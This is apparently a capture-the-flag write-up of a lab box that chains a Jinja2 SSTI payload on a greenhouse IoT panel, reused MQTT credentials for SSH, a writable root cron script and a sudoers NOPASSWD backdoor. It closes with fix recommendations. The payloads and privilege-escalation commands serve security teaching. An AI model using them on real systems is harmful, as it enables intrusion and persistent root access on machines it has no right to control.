# Invernadero — Server 2 Writeup

**Category:** Web (SSTI) → Container Escape → Cron Hijack → Privilege Escalation

## Summary

This box chains an **unauthenticated SSTI (Server-Side Template Injection)** on an IoT greenhouse management web panel into remote code execution, pivots through leaked MQTT credentials (password reuse) into a second host, and finally escalates to root by abusing a **world-writable cron script** running as root, culminating in a SUID bash and a permanent backdoor via `/etc/sudoers`.

## Recon

Nmap revealed 3 open ports:

```
22   - SSH
80   - HTTP
8080 - HTTP (IoT panel)
```

The web service on port 8080 was an IoT/greenhouse ("invernadero") management panel.

## Initial Access — Default Credentials + SSTI

Logged in to the panel using default credentials:

```
admin:admin123
```

After authentication, a parameter in the application was vulnerable to **Server-Side Template Injection (Jinja2)**. Confirmed and exploited RCE with the classic Python/Jinja2 SSTI payload:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

This gave command execution in the context of the web application, which was used to obtain an interactive reverse shell inside the container.

## Container Enumeration

Inside the container, a `.env` file disclosed credentials for the MQTT broker:

```
MQTT_BROKER=172.17.0.1
MQTT_USER=admin_invernadero
MQTT_PASSWORD=admin_invernadero123
```

The `MQTT_BROKER` IP (`172.17.0.1`) is the typical default Docker bridge gateway, hinting at a host/sibling container reachable from inside this container's network.

## Pivot — Credential Reuse over SSH

The MQTT credentials were reused for SSH access to a neighboring host:

```bash
ssh admin_invernadero@172.20.10.3
```

Login succeeded (Alpine Linux host), confirming **password reuse** between the MQTT service and the OS-level SSH account.

```
server1:~% whoami
admin_invernadero
server1:~% cat user.txt
flag{escape_de_contenedor_exitoso}
```

This flag explicitly confirms the pivot represented a successful "container escape" from the vulnerable web app's container onto the real host (`server1`).

## Privilege Escalation — Cron Job Abuse

While enumerating running processes, a periodic cron job running **as root** was observed via process auditing logs:

```
2026/10/15 09:07:00 CMD: UID=0  PID=3035  | /bin/sh /opt/invernadero/backup_logs.sh
2026/10/15 09:07:00 CMD: UID=0  PID=3036  | tar -czf /var/backups/mqtt/logs_20261015_090700.tar.gz /var/log/mqtt
2026/10/15 09:07:00 CMD: UID=0  PID=3038  | /bin/sh /opt/invernadero/backup_logs.sh
```

Checking `/opt/invernadero/backup_logs.sh`, the script was **writable by `admin_invernadero`**, while being executed by **root via cron**. This is a classic writable-cron-script privilege escalation.

### Exploitation

Appended a malicious line to the script, to be executed on the next cron run:

```bash
echo 'chmod u+s /bin/bash' >> backup_logs.sh
```

On the next cron execution (root context), `/bin/bash` was given the SUID bit:

```
server1:/opt/invernadero$ ls -la /bin/bash
-rwsr-xr-x    1 root     root        789472 Jan 25  2026 /bin/bash
```

Spawned a privileged shell:

```bash
/bin/bash -p
```

This yielded an **effective UID of root**, even though `whoami` still reported `admin_invernadero` (real UID unchanged, only EUID elevated via SUID).

### Persistence

To obtain a stable, full root session (rather than relying on EUID-only privileges), the SUID bash session was used to append a NOPASSWD sudoers rule for the user:

```bash
echo 'admin_invernadero ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

This succeeded because the SUID bash process had effective root privileges, allowing a write to `/etc/sudoers` despite the real user not being root.

Verified:

```bash
sudo -l
# User admin_invernadero may run the following commands on server1:
#     (ALL) NOPASSWD: ALL
```

Escalated cleanly:

```bash
sudo su
whoami
# root
```

## Flag

```
flag{root_invernadero_comprometido}
```

## Root Cause & Fix Recommendations

1. **Default credentials** (`admin:admin123`) on the IoT panel — must be forced to change on first login, or disabled entirely.
2. **SSTI in the web application** — user-controllable input was rendered directly into a Jinja2 template instead of being passed as template *context/data*. Fix: never pass untrusted input into `render_template_string`/template rendering; use sandboxed template environments and strict input validation.
3. **Hardcoded secrets in `.env`** inside the container — MQTT credentials should not be reused as OS account passwords, and secrets should be excluded from container images/readable paths accessible post-compromise.
4. **Password reuse across services** (MQTT password = SSH password) — enforce unique credentials per service.
5. **World-writable script executed by root via cron** — this is the critical escalation vector. Fix:
   - Cron scripts run as root must be owned by root and **not writable** by lower-privileged users (`chmod 700`, owned by `root:root`).
   - Apply the principle of least privilege: the backup job should run as a dedicated low-privilege service account, not root, where possible.
6. **No integrity monitoring** on `/etc/sudoers` or SUID binaries — file integrity monitoring (AIDE/Tripwire) or periodic SUID audits (`find / -perm -4000`) would have caught both the SUID bash and the sudoers tampering quickly.
